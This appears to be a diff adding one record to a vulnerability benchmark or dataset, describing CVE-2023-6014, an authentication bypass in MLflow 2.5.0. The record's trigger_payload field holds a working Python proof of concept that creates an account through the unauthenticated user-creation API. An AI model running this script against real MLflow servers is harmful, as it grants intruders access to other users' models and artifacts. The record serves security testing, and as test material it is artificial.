@@ -1,0 +1,15 @@
+{
+  "file_id": "165_mlflow_huntr_3e64df69-ddc2-463e-9809-d07c24dc1de4",
+  "numeric_id": "165",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Authentication bypass via unauthenticated user creation in MLflow REST API",
+  "cve": "CVE-2023-6014",
+  "cwe": "CWE-598: Use of GET Request Method With Sensitive Query Strings",
+  "library": "mlflow",
+  "affected_version": "== 2.5.0",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "#!/usr/bin/env python3\nimport string, random, requests\ndef create_account(URL):\n    endpoint = '/api/2.0/mlflow/users/create'\n    username = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))\n    password = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))\n    data = requests.post(URL + endpoint, data={\n        'username': username,\n        'password': password\n    })\n    print(f'[i]\\tCreating a user account with user ({username}), pw ({password})')\n    if data.status_code != 200:\n        print('Error creating account!')\n        exit(0)\n    print(f'returned: {data.text}')\n    return (username, password)\nif __name__ == '__main__':\n    print(create_account('http://172.16.250.130:5000'))",
+  "oracle": "An unauthenticated attacker can create a user account and then log in as a legitimate user, gaining access to models, experiments, and artifacts created by other users."
+}
